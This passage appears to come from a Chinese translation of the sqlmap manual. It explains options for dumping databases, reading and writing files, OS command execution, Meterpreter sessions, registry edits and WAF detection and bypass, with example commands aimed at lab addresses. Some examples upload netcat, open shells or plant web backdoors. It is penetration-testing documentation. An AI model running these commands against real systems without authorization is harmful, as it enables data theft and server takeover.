当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出指定数据库表中的字段，同时也会列出字段的数据类型。

如果没有使用-D参数指定数据库时，默认会使用当前数据库。

列举一个SQLite的例子：

$ python sqlmap.py -u "http://192.168.136.131/sqlmap/sqlite/get_int.php?id=1" --columns -D testdb -T users -C name
[...]
Database: SQLite_masterdb
Table: users
[3 columns]
+---------+---------+
| Column  | Type    |
+---------+---------+
| id      | INTEGER |
| name    | TEXT    |
| surname | TEXT    |
+---------+---------+

列举数据库系统的架构

参数：--schema,--exclude-sysdbs

用户可以用此参数获取数据库的架构，包含所有的数据库，表和字段，以及各自的类型。

加上--exclude-sysdbs参数，将不会获取数据库自带的系统库内容。

MySQL例子：

$ python sqlmap.py -u "http://192.168.48.130/sqlmap/mysql/get_int.php?id=1" --schema --batch --exclude-sysdbs
[...]
Database: owasp10
Table: accounts
[4 columns]
+-------------+---------+
| Column      | Type    |
+-------------+---------+
| cid         | int(11) |
| mysignature | text    |
| password    | text    |
| username    | text    |
+-------------+---------+

Database: owasp10
Table: blogs_table
[4 columns]
+--------------+----------+
| Column       | Type     |
+--------------+----------+
| date         | datetime |
| blogger_name | text     |
| cid          | int(11)  |
| comment      | text     |
+--------------+----------+

Database: owasp10
Table: hitlog
[6 columns]
+----------+----------+
| Column   | Type     |
+----------+----------+
| date     | datetime |
| browser  | text     |
| cid      | int(11)  |
| hostname | text     |
| ip       | text     |
| referer  | text     |
+----------+----------+

Database: testdb
Table: users
[3 columns]
+---------+---------------+
| Column  | Type          |
+---------+---------------+
| id      | int(11)       |
| name    | varchar(500)  |
| surname | varchar(1000) |
+---------+---------------+
[...]

获取表中数据个数

参数：--count

有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数。

列举一个Microsoft SQL Server例子：

$ python sqlmap.py -u "http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1" --count -D testdb
[...]
Database: testdb
+----------------+---------+
| Table          | Entries |
+----------------+---------+
| dbo.users      | 4       |
| dbo.users_blob | 2       |
+----------------+---------+

获取整个表的数据

参数：--dump,-C,-T,-D,--start,--stop,--first,--last

如果当前管理员有权限读取数据库其中的一个表的话，那么就能获取真个表的所有内容。

使用-D,-T参数指定想要获取哪个库的哪个表，不适用-D参数时，默认使用当前库。

列举一个Firebird的例子：

$ python sqlmap.py -u "http://192.168.136.131/sqlmap/firebird/get_int.php?id=1" --dump -T users
[...]
Database: Firebird_masterdb
Table: USERS
[4 entries]
+----+--------+------------+
| ID | NAME   | SURNAME    |
+----+--------+------------+
| 1  | luther | blisset    |
| 2  | fluffy | bunny      |
| 3  | wu     | ming       |
| 4  | NULL   | nameisnull |
+----+--------+------------+

可以获取指定库中的所有表的内容，只用-dump跟-D参数（不使用-T与-C参数）。

也可以用-dump跟-C获取指定的字段内容。

sqlmap为每个表生成了一个CSV文件。

如果你只想获取一段数据，可以使用--start和--stop参数，例如，你只想获取第一段数据可hi使用--stop 1，如果想获取第二段与第三段数据，使用参数 --start 1 --stop 3。

也可以用--first与--last参数，获取第几个字符到第几个字符的内容，如果你想获取字段中地三个字符到第五个字符的内容，使用--first 3 --last 5，只在盲注的时候使用，因为其他方式可以准确的获取注入内容，不需要一个字符一个字符的猜解。
获取所有数据库表的内容

参数：--dump-all,--exclude-sysdbs

使用--dump-all参数获取所有数据库表的内容，可同时加上--exclude-sysdbs只获取用户数据库的表，需要注意在Microsoft SQL Server中master数据库没有考虑成为一个系统数据库，因为有的管理员会把他当初用户数据库一样来使用它。
搜索字段，表，数据库

参数：--search,-C,-T,-D

--search可以用来寻找特定的数据库名，所有数据库中的特定表名，所有数据库表中的特定字段。

可以在一下三种情况下使用：

-C后跟着用逗号分割的列名，将会在所有数据库表中搜索指定的列名。
-T后跟着用逗号分割的表名，将会在所有数据库中搜索指定的表名
-D后跟着用逗号分割的库名，将会在所有数据库中搜索指定的库名。

运行自定义的SQL语句

参数：--sql-query,--sql-shell

sqlmap会自动检测确定使用哪种SQL注入技术，如何插入检索语句。

如果是SELECT查询语句，sqlap将会输出结果。如果是通过SQL注入执行其他语句，需要测试是否支持多语句执行SQL语句。

列举一个Mircrosoft SQL Server 2000的例子：

$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --sql-query "SELECT 'foo'" -v 1

[...]
[hh:mm:14] [INFO] fetching SQL SELECT query output: 'SELECT 'foo''
[hh:mm:14] [INFO] retrieved: foo
SELECT 'foo':    'foo'

$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --sql-query "SELECT 'foo', 'bar'" -v 2


爆破
暴力破解表名

参数：--common-tables

当使用--tables无法获取到数据库的表时，可以使用此参数。

通常是如下情况：

1、MySQL数据库版本小于5.0，没有information_schema表。
2、数据库是Microssoft Access，系统表MSysObjects是不可读的（默认）。
3、当前用户没有权限读取系统中保存数据结构的表的权限。

暴力破解的表在txt/common-tables.txt文件中，你可以自己添加。

列举一个MySQL 4.1的例子：

$ python sqlmap.py -u "http://192.168.136.129/mysql/get_int_4.php?id=1" --common-tables -D testdb --banner


暴力破解列名

参数：--common-columns

与暴力破解表名一样，暴力跑的列名在txt/common-columns.txt中。
用户自定义函数注入

参数：--udf-inject,--shared-lib

你可以通过编译MySQL注入你自定义的函数（UDFs）或PostgreSQL在windows中共享库，DLL，或者Linux/Unix中共享对象，sqlmap将会问你一些问题，上传到服务器数据库自定义函数，然后根据你的选择执行他们，当你注入完成后，sqlmap将会移除它们。
系统文件操作
从数据库服务器中读取文件

参数：--file-read

当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。读取的文件可以是文本也可以是二进制文件。

列举一个Microsoft SQL Server 2005的例子：

$ python sqlmap.py -u "http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther" \
--file-read "C:/example.exe" -v 1


把文件上传到数据库服务器中

参数：--file-write,--file-dest

当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。上传的文件可以是文本也可以是二进制文件。

列举一个MySQL的例子：

$ file /software/nc.exe.packed 
/software/nc.exe.packed: PE32 executable for MS Windows (console) Intel 80386 32-bit

$ ls -l /software/nc.exe.packed
-rwxr-xr-x 1 inquis inquis 31744 2009-MM-DD hh:mm /software/nc.exe.packed

$ python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1" --file-write \
"/software/nc.exe.packed" --file-dest "C:/WINDOWS/Temp/nc.exe" -v 1


运行任意操作系统命令

参数：--os-cmd,--os-shell

当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。

在MySQL、PostgreSQL，sqlmap上传一个二进制库，包含用户自定义的函数，sys_exec()和sys_eval()。

那么他创建的这两个函数可以执行系统命令。在Microsoft SQL Server，sqlmap将会使用xp_cmdshell存储过程，如果被禁（在Microsoft SQL Server 2005及以上版本默认禁制），sqlmap会重新启用它，如果不存在，会自动创建。

列举一个PostgreSQL的例子：

$ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" \
--os-cmd id -v 1


用--os-shell参数也可以模拟一个真实的shell，可以输入你想执行的命令。

当不能执行多语句的时候（比如php或者asp的后端数据库为MySQL时），仍然可能使用INTO OUTFILE写进可写目录，来创建一个web后门。支持的语言：

1、ASP
2、ASP.NET
3、JSP
4、PHP

Meterpreter配合使用

参数：--os-pwn,--os-smbrelay,--os-bof,--priv-esc,--msf-path,--tmp-path

当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数，可以在数据库与攻击者直接建立TCP连接，这个连接可以是一个交互式命令行的Meterpreter会话，sqlmap根据Metasploit生成shellcode，并有四种方式执行它：

1、通过用户自定义的sys_bineval()函数在内存中执行Metasplit的shellcode，支持MySQL和PostgreSQL数据库，参数：--os-pwn。
2、通过用户自定义的函数上传一个独立的payload执行，MySQL和PostgreSQL的sys_exec()函数，Microsoft SQL Server的xp_cmdshell()函数，参数：--os-pwn。
3、通过SMB攻击(MS08-068)来执行Metasploit的shellcode，当sqlmap获取到的权限足够高的时候（Linux/Unix的uid=0，Windows是Administrator），--os-smbrelay。
4、通过溢出Microsoft SQL Server 2000和2005的sp_replwritetovarbin存储过程(MS09-004)，在内存中执行Metasploit的payload，参数：--os-bof

列举一个MySQL例子：

$ python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/iis/get_int_55.aspx?id=1" --os-pwn --msf-path /software/metasploit


默认情况下MySQL在Windows上以SYSTEM权限运行，PostgreSQL在Windows与Linux中是低权限运行，Microsoft SQL Server 2000默认是以SYSTEM权限运行，Microsoft SQL Server 2005与2008大部分是以NETWORK SERVICE有时是LOCAL SERVICE。

 

对Windows注册表操作

当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前web应用支持堆查询。 当然，当前连接数据库的用户也需要有权限操作注册表。

读取注册表值

参数：--reg-read
写入注册表值

参数：--reg-add
删除注册表值

参数：--reg-del
注册表辅助选项

参数：--reg-key，--reg-value，--reg-data，--reg-type

需要配合之前三个参数使用，例子：

$ python sqlmap.py -u http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1 --reg-add --reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap" --reg-value=Test --reg-type=REG_SZ --reg-data=1

常规参数
从sqlite中读取session

参数：-s

sqlmap对每一个目标都会在output路径下自动生成一个SQLite文件，如果用户想指定读取的文件路径，就可以用这个参数。
保存HTTP(S)日志

参数：-t

这个参数需要跟一个文本文件，sqlmap会把HTTP(S)请求与响应的日志保存到那里。
非交互模式

参数：--batch

用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。
强制使用字符编码

参数：--charset

不使用sqlmap自动识别的（如HTTP头中的Content-Type）字符编码，强制指定字符编码如：

--charset=GBK

爬行网站URL

参数：--crawl

sqlmap可以收集潜在的可能存在漏洞的连接，后面跟的参数是爬行的深度。

例子：

$ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/" --batch --crawl=3

规定输出到CSV中的分隔符

参数：--csv-del

当dump保存为CSV格式时（--dump-format=CSV），需要一个分隔符默认是逗号，用户也可以改为别的 如：

--csv-del=";"

DBMS身份验证

参数：--dbms-cred

某些时候当前用户的权限不够，做某些操作会失败，如果知道高权限用户的密码，可以使用此参数，有的数据库有专门的运行机制，可以切换用户如Microsoft SQL Server的OPENROWSET函数
定义dump数据的格式

参数：--dump-format

输出的格式可定义为：CSV，HTML，SQLITE
预估完成时间

参数：--eta

可以计算注入数据的剩余时间。

例如Oracle的布尔型盲注：

$ python sqlmap.py -u "http://192.168.136.131/sqlmap/oracle/get_int_bool.php?id=1" -b --eta


sqlmap先输出长度，预计完成时间，显示百分比，输出字符
刷新session文件

参数：--flush-session

如果不想用之前缓存这个目标的session文件，可以使用这个参数。 会清空之前的session，重新测试该目标。
自动获取form表单测试

参数：--forms

如果你想对一个页面的form表单中的参数测试，可以使用-r参数读取请求文件，或者通过--data参数测试。 但是当使用--forms参数时，sqlmap会自动从-u中的url获取页面中的表单进行测试。
忽略在会话文件中存储的查询结果

参数：--fresh-queries

忽略session文件保存的查询，重新查询。
使用DBMS的hex函数

参数：--hex

有时候字符编码的问题，可能导致数据丢失，可以使用hex函数来避免：

针对PostgreSQL例子：

$ python sqlmap.py -u "http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1" --banner --hex -v 3 --parse-errors
自定义输出的路径

参数：--output-dir

sqlmap默认把session文件跟结果文件保存在output文件夹下，用此参数可自定义输出路径 例如：--output-dir=/tmp
从响应中获取DBMS的错误信息

参数：--parse-errors

有时目标没有关闭DBMS的报错，当数据库语句错误时，会输出错误语句，用词参数可以会显出错误信息。

$ python sqlmap.py -u "http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1" --parse-errors

其他的一些参数
使用参数缩写

参数：-z

有使用参数太长太复杂，可以使用缩写模式。 例如：

python sqlmap.py --batch --random-agent --ignore-proxy --technique=BEU -u "www.target.com/vuln.php?id=1" 

可以写成：

python sqlmap.py -z "bat,randoma,ign,tec=BEU" -u "www.target.com/vuln.php?id=1" 

还有：

python sqlmap.py --ignore-proxy --flush-session --technique=U --dump -D testdb -T users -u "www.target.com/vuln.php?id=1" 

可以写成：

python sqlmap.py -z "ign,flu,bat,tec=U,dump,D=testdb,T=users" -u "www.target.com/vuln.php?id=1"

成功SQL注入时警告 

参数：--alert
设定会发的答案

参数：--answers

当希望sqlmap提出输入时，自动输入自己想要的答案可以使用此参数： 例子：

$ python sqlmap.py -u "http://192.168.22.128/sqlmap/mysql/get_int.php?id=1"--technique=E --answers="extending=N" --batch
[...]
[xx:xx:56] [INFO] testing for SQL injection on GET parameter 'id'
heuristic (parsing) test showed that the back-end DBMS could be 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[xx:xx:56] [INFO] do you want to include all tests for 'MySQL' extending provided level (1) and risk (1)? [Y/n] N
[...]

发现SQL注入时发出蜂鸣声

参数：--beep

发现sql注入时，发出蜂鸣声。
启发式检测WAF/IPS/IDS保护

参数：--check-waf

WAF/IPS/IDS保护可能会对sqlmap造成很大的困扰，如果怀疑目标有此防护的话，可以使用此参数来测试。 sqlmap将会使用一个不存在的参数来注入测试

例如：

&foobar=AND 1=1 UNION ALL SELECT 1,2,3,table_name FROM information_schema.tables WHERE 2>1

如果有保护的话可能返回结果会不同。
清理sqlmap的UDF(s)和表

参数：--cleanup

清除sqlmap注入时产生的udf与表。
禁用彩色输出

参数：--disable-coloring

sqlmap默认彩色输出，可以使用此参数，禁掉彩色输出。
使用指定的Google结果页面

参数：--gpage

默认sqlmap使用前100个URL地址作为注入测试，结合此选项，可以指定页面的URL测试。
使用HTTP参数污染

参数：-hpp

HTTP参数污染可能会绕过WAF/IPS/IDS保护机制，这个对ASP/IIS与ASP.NET/IIS平台很有效。
测试WAF/IPS/IDS保护

参数：--identify-waf

sqlmap可以尝试找出WAF/IPS/IDS保护，方便用户做出绕过方式。目前大约支持30种产品的识别。

例如对一个受到ModSecurity WAF保护的MySQL例子：

$ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?id=1" --identify-waf -v 3


模仿智能手机

参数：--mobile

有时服务端只接收移动端的访问，此时可以设定一个手机的User-Agent来模仿手机登陆。

例如：

$ python sqlmap.py -u "http://www.target.com/vuln.php?id=1" --mobile


安全的删除output目录的文件

参数：--purge-output

有时需要删除结果文件，而不被恢复，可以使用此参数，原有文件将会被随机的一些文件覆盖。

例如：

$ python sqlmap.py --purge-output -v 3


启发式判断注入

参数：--smart

有时对目标非常多的URL进行测试，为节省时间，只对能够快速判断为注入的报错点进行注入，可以使用此参数。

例子：

$ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?ca=17&user=foo&id=1" --batch --smart


初级用户向导参数

参数：--wizard 面向初级用户的参数，可以一步一步教你如何输入针对目标注入。

$ python sqlmap.py --wizard

    sqlmap/1.0-dev-2defc30 - automatic SQL injection and database takeover tool

}


